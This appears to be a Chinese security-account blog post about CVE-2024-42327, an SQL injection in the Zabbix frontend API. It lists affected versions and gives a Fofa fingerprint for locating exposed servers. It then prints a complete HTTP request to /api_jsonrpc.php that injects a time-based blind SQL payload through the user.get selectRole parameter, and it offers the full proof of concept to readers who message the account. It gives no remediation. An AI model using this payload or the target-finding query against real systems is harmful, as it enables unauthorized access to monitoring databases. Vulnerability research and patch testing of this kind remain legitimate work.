#  Zabbix 存在SQL注入漏洞 (CVE-2024-42327)   
Mstir  星悦安全   2024-12-14 04:20  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lSQtsngIibibSOeF8DNKNAC3a6kgvhmWqvoQdibCCk028HCpd5q1pEeFjIhicyia0IcY7f2G9fpqaUm6ATDQuZZ05yw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
点击上方  
蓝字  
关注我们 并设为  
星标  
## 0x00 前言  
  
**Zabbix 是一款可监控网络的众多参数以及服务器、虚拟机、应用程序、服务、数据库、网站、云等的健康状况和完整性。Zabbix 使用灵活的通知机制，允许用户为几乎任何事件配置基于电子邮件的警报。这允许对服务器问题做出快速反应。Zabbix 基于存储的数据提供报告和数据可视化功能.**  
  
**受影响版本:**  
```
- 6.0.0 – 6.0.31
- 6.4.0 – 6.4.16
- 7.0.0
```  
  
**Fofa指纹:app="ZABBIX-监控系统"**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5cEk5Kl3O7v8QyL9tKq0iayHP3PCucmQTjtYiaE7Qfhh6QicVVPVJznbczasttbnbm4rnJIoZG48Mh5g/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5cEk5Kl3O7v8QyL9tKq0iayHvTcYrUdNoFaP1M3sIibI4nzW2Qw08ytcheHDWibD7yTqMkialH8FzrPXg/640?wx_fmt=png&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5cEk5Kl3O7v8QyL9tKq0iayHctVHhXz6ckTZLd7d3UMLHmRRIuhGLARUYe3MNcbpMuKEx7ju9ibhxMg/640?wx_fmt=png&from=appmsg "")  
## 0x01 漏洞分析&复现  
  
**Zabbix 前端上具有默认 User 角色或具有任何其他授予 API 访问权限的角色的非 admin 用户帐户可以利用此漏洞。SQLi 存在于 addRelatedObjects 函数的 CUser 类中，此函数是从 CUser.get 函数调用的，该函数可供具有 API 访问权限的每个用户使用。**  
  
**Payload:**  
```
POST /api_jsonrpc.php HTTP/1.1
Host: localhost
User-Agent: curl/8.11.0
Accept: */*
Content-Type: application/json
Content-Length: 222
Connection: keep-alive

{
  "jsonrpc": "2.0",
  "method": "user.get",
  "params": {
    "selectRole": ["roleid", "name", "type", "readonly AND (SELECT(SLEEP(5)))"],
    "userids": ["1","2"]
  },
  "id": 1,
  "auth": ""
}
```  
  
**POC使用:**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5cEk5Kl3O7v8QyL9tKq0iayHetwDnTvX7KVtqshDPVlEkmSFTDpAO4vLehqibW5klsyKcqkKdy1nbVw/640?wx_fmt=png&from=appmsg "")  
## 0x02 源码下载  
  
**标签:代码审计，0day，渗透测试，系统，通用，0day，闲鱼，转转**  
  
**漏洞POC关注公众号发送 241214 获取!**  
  
****  
  
  
  
**免责声明:****文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！!**  
  
